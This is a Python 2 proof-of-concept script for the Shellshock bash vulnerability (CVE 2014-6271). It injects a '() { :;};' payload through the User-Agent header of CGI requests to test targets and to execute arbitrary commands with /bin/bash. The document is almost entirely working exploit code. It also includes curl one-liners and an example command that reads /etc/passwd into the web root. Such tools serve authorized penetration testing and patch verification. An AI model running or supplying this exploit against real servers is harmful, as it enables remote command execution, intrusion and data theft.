'''

CVE 2014-6271 PoC Tool by kaitoY 
    kaitoy@qq.com

Usage:
    shellshock.py -u <url> test
    shellshock.py -u <url> exec -c <command>
    shellshock.py -u <url> get

Manual commands:
    curl -i -X HEAD "<url>" -A '() { :;}; echo "Warning: Server Vulnerable"'
    curl -A '() { :;}; /bin/bash -c "<cmd>"' <url>

'''

import sys
import urllib2

class PrintUsage:
    # Print program usage and version etc.
    __version__ = '0.1.0'

    def print_argparse_warning(self):
        print("""WARNING:
            You seems to be running Python without 'argparse'. Please install
            the module so I can handle your options:
                [sudo] pip install argparse
            nwcaller is exiting.""")      

    def print_version_info(self):
        print("CVE: 2014-6271 PoC Tool by kaitoY v%s" % self.__version__)

class ArgParser:
    # Class for parsing arguments

    def __init__(self):
        # Check if client has argparse module
        self.__has_argparse = True
        try:
            import argparse
        except ImportError:
            self.__has_argparse = False

    def check_argparse(self):
        # Return if client has argparse module
        return self.__has_argparse

    def parse(self):
        # Parse arguments from cli
        import argparse
        from argparse import RawTextHelpFormatter
        __parser = argparse.ArgumentParser(description= 'CVE: 2014-6271 PoC Tool', 
                                           formatter_class = RawTextHelpFormatter)
        __parser.add_argument('-u', 
                              dest = 'url', 
                              type = str, 
                              required = True, 
                              help = 'Target url, e.g. http://<hostname>/cgi-bin/poc.cgi')
        __parser.add_argument('-v', 
                              dest = 'verbose', 
                              action = 'store_true',
                              default = False,
                              help = 'Display verbose information and result')

        subparsers = __parser.add_subparsers(title = 'actions',
                                             dest = 'action',
                                             help = 'Actions you would like to perform')

        __parser_test = subparsers.add_parser ('test', 
                                                help = 'Test if target url is vulnerable')

        __parser_exec = subparsers.add_parser ('exec', 
                                                help = 'Execute command')
        __parser_exec.add_argument('-c', 
                                    dest = 'cmd',
                                    type = str, 
                                    required = True, 
                                    help = 'The command you\'d like to run, e.g. \"/bin/cat /etc/passwd > /var/www/html/passwd.txt\"')

        __parser_get = subparsers.add_parser ('get', 
                                               help = 'Get response from URL')

        return vars(__parser.parse_args())

class ShellShock():

    def __init__(self, args):
        self._args = args

    def run_test(self):
        opener = urllib2.build_opener()
        opener.addheaders = [('User-agent', '() { :;}; echo \"Shellshock: Server Vulnerable\"')]
        try:
            resp = opener.open(self._args['url'])
        except urllib2.HTTPError, e:
            print e
            sys.exit(0)
        if resp.headers.has_key('Shellshock'):
            print 'Server Vulnerable'
        else:
            print 'Server not Vulnerable'
        if self._args['verbose']:
            print '='*16 + '\n' 'Response Headers\n' + '='*16
            print resp.headers

    def run_exec(self):
        opener = urllib2.build_opener()
        opener.addheaders = [('User-agent', '() { :;}; /bin/bash -c \"' + self._args['cmd'] + '\"')]
        try:
            resp = opener.open(self._args['url'])
            if self._args['verbose']:
                print '='*16 + '\n' 'Response Headers\n' + '='*16
                print resp.headers
                print '='*16 + '\n' 'Response\n' + '='*16
                print resp.read()
        except urllib2.HTTPError, e:
            if self._args['verbose']:
                print e
            if e.getcode() == 500:
                print 'Command sent to server'
            else:
                print 'Failed to send command'

    def run_get(self):
        opener = urllib2.build_opener()
        try:
            resp = opener.open(self._args['url'])
            if self._args['verbose']:
                print '='*16 + '\n' 'Response Headers\n' + '='*16
                print resp.headers
                print '='*16 + '\n' 'Response\n' + '='*16
                print resp.read()
            else:
                print resp.read()
        except urllib2.HTTPError, e:
            if self._args['verbose']:
                print e


    def dispatch(self, value):
        method_name = 'run_' + str(value)
        method = getattr(self, method_name)
        method()

    def run(self):
        self.dispatch(self._args['action'])


if __name__ == '__main__':

    arg_parser = ArgParser()

    if not arg_parser.check_argparse():
        PrintUsage().print_argparse_warning()
        sys.exit()
    else:
        args = arg_parser.parse()
    try:
        shellShock = ShellShock(args).run()
    except KeyboardInterrupt:
        print '\nOperation aborted.'
        sys.exit()